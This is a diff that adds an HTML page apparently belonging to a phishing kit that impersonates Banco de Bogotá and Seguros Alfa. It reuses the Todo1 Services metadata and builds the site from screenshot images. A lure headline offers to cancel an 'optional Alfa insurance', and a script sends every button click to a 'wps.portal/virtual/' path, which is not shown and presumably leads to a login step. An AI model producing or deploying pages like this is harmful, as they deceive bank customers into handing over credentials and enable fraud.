@@ -1,0 +1,264 @@
+<html>
+	<head>
+  		<title>Banco de Bogotá - Seguros Alfa</title>
+  		<meta http-equiv="content-type" content="text/html; utf-8">
+  		<meta charset="utf-8">
+  		
+		<meta content="es" http-equiv="Content-Language">
+  	
+		<meta name="description" content="Todo1">
+  		<meta name="author" content="Todo1 Services">
+  		<meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved.">
+  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	   	<link rel="icon" href="wps.portal/virtual/img/favicon32.ico" type="image/x-icon">
+	   	<link href="wps.portal/virtual/css/stylesheet.css" rel="stylesheet">
+		<script type="text/javascript" src="wps.portal/js/jquery-3.6.0.min.js"></script>
+   		<style>
+   			*{
+   				font-family: 'SF Pro Display'; 
+   			}
+   			.menu-item{
+   				font-size: 16px;
+   				color: rgb(19, 31, 35);
+   				font-weight: 500;
+   				letter-spacing: normal;
+				line-height: 19px;
+				text-align: center;
+				padding: 0px 8px;
+				text-overflow: ellipsis;
+  				white-space: nowrap;
+   			}
+   			.fila{
+   				width: 90%;
+   				max-width: 1208px;
+   				margin: 0 auto;
+   			}
+   			.mostrar1{
+		    	display: none;
+		    }
+		    header{
+		    	padding-top: 20px;
+		    }
+		    .titulo-baner{
+		    	font-family: 'SF Pro Display' !important;
+		   		color: rgb(26, 26, 26);
+		   		font-weight: 900 !important;
+    			font-style: normal;	   		
+    			letter-spacing: 0px;
+    			line-height: 76px;
+    			text-transform: capitalize;
+    			font-size: 64px;
+		    }
+		    #texto-baner{
+				display: none;
+				text-align: center;				
+				font-size: 36px;
+				line-height: 40px;				
+			}
+			.titulo{
+				color: rgb(53, 53, 53);
+    			letter-spacing: 0.98px;
+    			line-height: 43px;
+    			font-size: 40px;
+				font-weight: 900;
+			}
+			.descripcion{
+				font-stretch: condensed;
+    			color: rgb(62, 69, 67);
+    			font-size: 22px;
+    			letter-spacing: 0px;
+    			line-height: 30px;
+			}
+
+			#seguro2,#seguro3,#seguro4,#seguro5,#asociados2,#asociados3,#asociados4{
+				display: none;
+			}
+
+
+			#seguros-mob{
+				display: none;
+				padding: 10px 25px;
+			}
+			#carrusel-dot{
+				display: none;
+			}
+
+			.btn-ingresar{
+				cursor: pointer;
+			}
+
+
+
+			#descripcion-mob,#bton-mob{
+				display: none;
+			}
+
+
+
+			@media (max-width:1250px) {
+				#seguro1,#seguro3,#seguro4,#seguro5,#asociados1,#asociados3,#asociados4{
+					display: none;
+				}
+				#seguro2,#asociados2{
+					display: initial;
+				}
+			}
+			
+   			@media (max-width:1025px) {
+   				header{
+			    	padding-top: 0px;
+			    }
+			    .quitar1{        
+			        display: none;    
+			    }
+			    .mostrar1{
+			    	display: initial;
+			    }
+
+			    #seguro1,#seguro3,#seguro2,#seguro5,#asociados1,#asociados2,#asociados4{
+					display: none;
+				}
+				#seguro4,#carrusel-dot,#asociados3{
+					display: initial;
+				}
+			}
+
+			
+			@media (max-width:890px) {
+				#seguros-mob{
+					display: initial;
+				}
+				#seguros-desk{
+					display: none;
+				}
+
+				.titulo{
+	    			line-height: 33px;
+	    			font-size: 30px;
+
+				}
+				.descripcion{					
+	    			font-size: 18px;	    			
+	    			line-height: 22px;
+				}
+
+
+
+			}
+
+			@media (max-width:760px) {
+				#baner-izq{
+					display: none;
+				}
+				#baner-der{
+					width: 100%;
+				}
+
+
+				#texto-baner,#descripcion-mob,#bton-mob{
+					display: block;
+				}
+			}
+
+			@media (max-width:640px) {
+				#seguro1,#seguro2,#seguro3,#seguro4,#asociados2,#asociados3,#asociados1{
+					display: none;
+				}
+				#seguro5,#asociados4{
+					display: initial;
+				}
+			}
+   		</style>
+   	</head>
+   	<body>
+   		<header class="fila">
+   			<table width="100%" cellpadding="0" cellspacing="0" border="0">
+   				<tr>
+   					<td valign="middle" align="left"><img src="wps.portal/virtual/img/logo.jpg" width="100%" style="margin-right: 20px; max-width: 389px;" class="quitar1"><img src="wps.portal/virtual/img/btn-menu.jpg" class="mostrar1"></td>
+   					<td valign="middle" class="menu-item quitar1">Descubre Alfa</td>
+   					<td valign="middle" class="menu-item quitar1">Personas</td>
+   					<td valign="middle" class="menu-item quitar1">Empresas</td>
+   					<td valign="middle" class="menu-item quitar1">Para ti</td>
+   					<td valign="middle" class="menu-item quitar1">Legal</td>
+   					<td valign="middle" class="menu-item quitar1">Atención</td>
+   					<td valign="middle" class="menu-item quitar1">Covid-19</td>
+   					<td valign="middle" align="right" class="quitar1"><img src="wps.portal/virtual/img/btn-ingreso.jpg" class="btn-ingresar"></td>
+   					<td valign="middle" align="right"><img src="wps.portal/virtual/img/btn-convertic.jpg" class="quitar1">
+   						<table class="mostrar1"><tr><td valign="middle" align="right"><img src="wps.portal/virtual/img/btn-ingreso.jpg" class="btn-ingresar"></td><td valign="middle" align="right"><img src="wps.portal/virtual/img/btn-convertic.jpg"></td></tr></table>
+   					</td>
+   				</tr>
+   			</table>
+   		</header>
+   		<main class="fila">
+   			<br><br>
+			<div class="titulo-baner" id="texto-baner">Inicia el proceso de cancelación del seguro opcional Alfa</div>
+			<br>
+   						<p class="descripcion" id="descripcion-mob">Accede a los nuevos servicios que Banco de Bogotá y Seguros Alfa te ofrecen para tu seguridad y tranquilidad. Disfruta todos los beneficios adiciones a tus coberturas y dale seguridad a tu desarrollo personal y profesional</p>
+   						<br>
+   			<img src="wps.portal/virtual/img/btn-cancelar-seguro.jpg" class="btn-ingresar" style="margin-bottom: 40px;" id="bton-mob"> 
+   			<table width="100%" cellpadding="0" cellspacing="0" border="0">
+   				<tr>
+   					<td width="50%" align="left" id="baner-izq">
+   						<div class="titulo">Inicia el proceso de cancelación del seguro opcional Alfa</div><br>
+   						<p class="descripcion">Accede a los nuevos servicios que Banco de Bogotá y Seguros Alfa te ofrecen para tu seguridad y tranquilidad. Disfruta todos los beneficios adiciones a tus coberturas y dale seguridad a tu desarrollo personal y profesional</p>
+   						<br>
+   			<img src="wps.portal/virtual/img/btn-cancelar-seguro.jpg" class="btn-ingresar"> 
+   					</td>
+   					<td width="50%" align="right" id="baner-der">
+   						<img src="wps.portal/virtual/img/baner.jpg" width="100%">
+   					</td>
+   				</tr>
+   			</table>
+   			  			
+   			<br>
+   			<div style="border-bottom: 1.3px solid rgb(216, 216, 216);"></div>
+   			<div style="background-color: #FAFAFA;">
+	   			<br>
+	   			<br>
+	   			<div id="seguros-mob">
+	   				<h1 class="titulo">Oferta de seguros para ti.</h1>
+	<p class="descripcion">Conoce los seguros que puedes adquirir para tus productos bancarios con el Banco de Bogotá.</p>	
+	   			</div>
+	   			<table width="100%" cellpadding="0" cellspacing="0" border="0" id="seguros-desk">
+	   				<tr>
+	   					<td align="left" valign="top">
+	   						<h1 class="titulo">Oferta de seguros para ti.</h1>
+	<p class="descripcion">Conoce los seguros que puedes adquirir para tus productos bancarios con el Banco de Bogotá.</p>
+	   					</td>
+	   					<td align="right" valign="top"><img src="wps.portal/virtual/img/btn-carrusel.jpg"></td>
+	   				</tr>
+	   			</table>
+	   			<br>
+	   			<div style="text-align: center;">
+	   				<img src="wps.portal/virtual/img/sec-seguros.jpg" width="100%" style="max-width: 1207px;" id="seguro1">
+	   				<img src="wps.portal/virtual/img/sec-seguros-3.jpg" width="100%" style="max-width: 905px;" id="seguro2">
+	   				<img src="wps.portal/virtual/img/sec-seguros-2.jpg" width="100%" style="max-width: 604px;" id="seguro3">
+	   				<img src="wps.portal/virtual/img/sec-seguros-2a.jpg" width="100%" style="max-width: 773px;" id="seguro4">
+	   				<img src="wps.portal/virtual/img/sec-seguros-1.jpg" width="100%" style="max-width: 403px;" id="seguro5">
+	   				<img src="wps.portal/virtual/img/carrusel.jpg" id="carrusel-dod">
+
+	   			</div>
+	   		</div>
+	   		<div>
+	   			<h1 class="titulo">Seguros Asociados</h1>	   			
+	   		</div>
+	   		<div style="text-align:center;">
+	   			<img src="wps.portal/virtual/img/asociados1.jpg" width="100%" style="max-width: 1190px;" id="asociados1">
+	   			<img src="wps.portal/virtual/img/asociados2.jpg" width="100%" style="max-width: 877px;" id="asociados2">
+	   			<img src="wps.portal/virtual/img/asociados3.jpg" width="100%" style="max-width: 575px;" id="asociados3">
+	   			<img src="wps.portal/virtual/img/asociados4.jpg" width="100%" style="max-width: 412px;" id="asociados4">
+	   		</div>
+   		</main>
+   		<footer class="fila">
+   			
+   		</footer>
+   	</body>
+</html>
+<script type="text/javascript">
+	$(document).ready(function() {
+		$(".btn-ingresar").click(function(){
+			 window.location.href='wps.portal/virtual/';
+		});		
+	});	
+</script>
